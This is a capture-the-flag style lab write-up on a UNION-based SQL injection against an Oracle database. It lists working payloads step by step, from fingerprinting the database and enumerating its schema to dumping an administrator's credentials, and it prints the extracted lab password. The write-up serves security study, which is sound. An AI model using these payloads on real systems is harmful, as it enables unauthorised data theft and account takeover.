Lab 6: SQL Injection UNION Attack, Extracting Data from Other Tables (Oracle)
Objective: Map the internal structure of an Oracle database to locate and extract administrative credentials, ultimately compromising the application's authentication mechanism.
Vulnerability Analysis: The application's category filter is vulnerable to a UNION-based SQL injection. Because the application reflects the database's output directly to the user interface, it is possible to append secondary queries. This allows an attacker to query Oracle's internal data dictionary views to discover hidden tables and columns, leading to data exfiltration.
Exploitation Methodology:
1. Determining Query Geometry & Database Fingerprinting Initial testing with an injected single quote (') triggered a 500 Internal Server Error, confirming the injection point. I then used the ORDER BY clause to determine the backend query's column count:
' ORDER BY 1 -- (Success)
' ORDER BY 2 -- (Success)
' ORDER BY 3 -- (Error) This established a two-column requirement. To verify data types and fingerprint the database, I attempted a UNION query:
' UNION SELECT 'a', 'a' -- (Error)
' UNION SELECT 'a', 'a' FROM DUAL -- (Success) The requirement of the FROM DUAL clause confirmed the backend is an Oracle database, and the successful execution verified both columns accept string data.
2. Version Enumeration (Optional but Recommended) To gain situational awareness of the target environment, I queried the v$version view:
Payload: ' UNION SELECT banner, NULL FROM v$version --
Result: The application returned Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production.
3. Schema Enumeration (Tables) Unlike PostgreSQL or MySQL, Oracle does not use information_schema. To find the table containing user credentials, I queried the all_tables view.
Payload: ' UNION SELECT table_name, NULL FROM all_tables --
Result: Extracted the dynamically generated target table name: USERS_ZAOKRS.
4. Schema Enumeration (Columns) With the target table identified, I queried the all_tab_columns view, filtering specifically for the target table to map its internal structure.
Payload: ' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_ZAOKRS' --
Result: Identified two critical columns: USERNAME_ESXTAV and PASSWORD_CQYWIB.
5. Data Exfiltration & Account Compromise Using the discovered table and column names, I constructed the final exfiltration payload to dump the credentials.
Payload: ' UNION SELECT USERNAME_ESXTAV, PASSWORD_CQYWIB FROM USERS_ZAOKRS --
Result: Successfully extracted the administrator credentials (administrator : i5adu1t7jgcr9gvnba9z).
Impact: By systematically mapping the Oracle database schema, I was able to extract sensitive authentication data. Utilizing these credentials allowed for a complete bypass of the login portal, granting full administrative access to the application.
